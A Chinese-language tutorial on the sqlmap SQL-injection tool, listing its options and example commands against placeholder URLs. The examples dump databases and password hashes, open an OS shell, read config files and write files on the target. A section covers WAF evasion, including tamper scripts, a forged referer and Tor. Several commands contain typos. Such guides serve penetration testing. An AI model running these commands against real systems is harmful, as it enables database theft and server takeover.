# sqlmap使用教程

## 介绍
SQLMAP 是一款开源的渗透测试工具，能够自动检测和利用 SQL 注入漏洞，从而接管数据库服务器。它拥有强大的探测引擎和丰富的功能，可以进行数据库提权、文件系统访问、操作系统命令执行等操作。

## 常用参数
### 基础参数:  
`--version`: 显示程序版本号并退出  
`-h, --help`: 显示帮助信息并退出  
`-u`: 设置目标 URL  
`-p`: 指定测试参数  
`-D`: 指定要枚举的数据库名  
`-T`: 参数用于指定要枚举的数据库表名  
`-C`: 指定要枚举的数据库列  
`-U`: 指定要枚举的数据库用户  
`--current-user`: 获取当前用户名称  
`--current-db`: 获取当前数据库名称  
`--cookie`: 设置 cookie 值  
`--dbs`: 列出数据库  
`--tables`: 列出数据库中的表  
`--columns`: 列出表中的列  
`--dump`: 列出表中的字段  
`--sql-shell`: 执行 SQL 命令  
`--os-cmd`: 执行系统命令  
`--os-shell`: 与系统交互 shell  
`-r`: 加载外部请求包  
`--batch`: 使用默认参数进行测试  
`--data=DATA`: 通过 POST 发送数据字符串  
`--level=LEVEL`: 执行测试的等级（1-5，默认为 1）  
`--risk=RISK`: 执行测试的风险（0-3，默认为 1）  
`-v VERBOSE`: 详细级别: 0-6 (默认为 1)  
`--proxy=PROXY`: 使用 HTTP 代理连接到目标 URL  
`--user-agent`: 指定 HTTP User-Agent  
`--tamper=TAMPER`: 使用给定的脚本 (S) 篡改注入数据  
`--random-agent`: 随机的请求头  

**Tamper 脚本**:   
使用方法: `--tamper xxx.py`  
例如: 
```
--tamper base64encode.py
```

## 使用示例
### 基础使用 
判断注入点和数据类型:  
- GET 方法注入  
```
sqlmap -u http://www.test.php?id=1
```
- POST 方法注入
```
sqlmap -r /etc/url.txt
```
判断数据库名 (dbs): 
```
sqlmap -u "http://www.test.php?id=1" --dbs
```
判断表名 (tables): 
```
sqlmap -u "http://www.test.php?id=1" -D 数据库名 --tables
```
判断列名 (columns): 
```
sqlmap -u "http://www.test.php?id=1"-D 数据库名 -T 表名 --column
```
获取字段: 
```
sqlmap -u "http://www.test.php?id=1" -D 数据库名 -T 表名 -C 列名 --dump
```

### 进阶使用
获取当前用户名称：
```
sqlmap -u "http://url/news?id=1" --current-user
```
获取当前数据库名称：
```
sqlmap -u "http://url/news?id=1" --current-db
```
枚举所有数据库名：
```
sqlmap -u "http://url/news?id=1" --dbs
```
列出指定数据库的表名：
```
sqlmap -u "http://url/news?id=1" -D "db_name" --tables
```
列出指定数据库对应表的字段：
```
sqlmap -u "http://url/news?id=1" -D "db_name" -T "table_name" --columns
```
获取字段内容：
```
sqlmap -u "http://url/news?id=1" -D "db_name" -T "table_name" -C "column_name" --dump
```
指定数据库类型：
```
sqlmap -u "http://url/news?id=1" --dbms "Mysql" --users
```
列出数据库用户：
```
sqlmap -u "http://url/news?id=1" --users
```
枚举指定的数据库用户：
```
sqlmap -u "http://url/news?id=1" --users -U root
```
数据库用户密码：
```
sqlmap -u "http://url/news?id=1" --passwords
```
执行指定 sql 命令：
```
sqlmap -u "http://url/news?id=1" --sql-shell/--os-cmd
```
执行系统命令：
```
sqlmap -u "http://url/news?id=1" --os-cmd=whoami
```
系统交互 shell：
```
sqlmap -u "http://url/news?id=1" --os-shell
```
保存进度：
```
sqlmap -u "http://url/news?id=1" --dbs -o"sqImap.log"
```
恢复已保存进度：
```
sqlap -u "http://url/news?id=1" --dbs -o"sqlmap.log" --resume
```
加载脚本：
```
sqlmap -u "http://url/news?id=1" --tamper "base64encode.py"
```
指定注入参数：
```
sqlmap -u "http://url/news?id=1" -p id
```
爆出该数据库中的所有数据：
```
sqlmap -u "http://url/news?id=1" --dump-all
```
指定代理：
```
sqlmap -u "http://url/news?id=1" --proxy="http://127.0.0.1:8080"
```
爆破 HTTPS 网站：
```
sqlmap -u "http://url/news?id=1" --delay=3 --force-ssl
```
判断当前用户是否有管理员权限：
```
sqlmap -u "http://url/news?id=1" --is-dba
```
检测是否有 WAF：
```
sqlmap -u "http://url/news?id=1" --identify-waf
```
读取目标服务器文件：
```
sqlmap -u "http://url/news?id=1" --file-read "c:/test.txt"
```
上传文件到目标服务器：
```
sqlmap -u "http://url/news?id=1" --file-write test.txt --file-dest "e:/hack.txt"
```

## 过 WAF 手法
**sqlmap -u "http://url/news?id=1"**  
`--random-agent` (使用任意的 User-Agent 爆破)  
`-v3` (输出详细度)  
`--threads 5` (指定线程数)  
`--fresh-queries` (清除缓存)  
`--flush-session` (清空会话)  
`--batch` (默认交互)  
`--random-agent` (任意的 http 头)  
`--tamper "base64encode.py"` (对提交的数据进行 base64 编码)  
`--referer http://www.baidu.com` (伪造 referer 字段)  
`--random-agent` (使用任意 HTTP 头进行绕过)  
`--time-sec=3` (使用长的延时来避免触发 WAF 的机制)  
`--hpp` (使用 HTTP 参数污染进行绕过)  
`--proxy=http://127.0.0.1:7890` (使用代理进行绕过)  
`--ignore-proxy` (禁止使用系统的代理)  
`--flush-session` (清空会话)  
`--hex 或 --no-cast` (进行字符码转换)  
`--mobile` (对移动端的服务器进行注入)  
`--tor` (匿名注入)  

## 直接使用
- 对目标 URL https://www.vuln.cn/post.php?id=1 进行 SQL 注入测试，强制使用 SSL 连接，并通过本地代理服务器 http://127.0.0.1:7890 发送请求。命令会自动执行所有操作，无需用户交互，并尝试列出目标数据库管理系统中的所有数据库名称：
```
python sqlmap.py -u "https://www.vuln.cn/post.php?id=1" --force-ssl --proxy "http://127.0.0.1:7890" --batch --dbs
```

- 对目标 URL http://www.vuln.cn 进行 SQL 注入测试，同时携带 id=11 的 Cookie，以模拟用户登录状态或绕过基于 Cookie 的限制。命令以测试级别 2 运行，检测更多潜在的注入点：
```
python sqlmap.py -u "http://www.vuln.cn" –cookie "id=11" --level 2
```

- 对目标 URL www.xxxx.com/product/detail/id/3*.html 进行 SQL 注入测试，目标数据库管理系统指定为 MySQL。命令以详细级别 3 运行，输出更多调试信息，帮助用户更好地了解注入过程：
```
python sqlmap.py -u "www.xxxx.com/product/detail/id/3*.html" --dbms=mysql -v 3
```

- 从文件 c:\request.txt 中读取 HTTP 请求，并对请求中的 id 参数进行 SQL 注入测试，目标数据库管理系统指定为 MySQL。命令尝试读取目标服务器上的文件 e:\www\as\config.php，这通常用于获取敏感信息（如数据库配置文件）：
```
python sqlmap.py -r "c:\request.txt" -p id –dbms mysql –file-read="e:\www\as\config.php"
```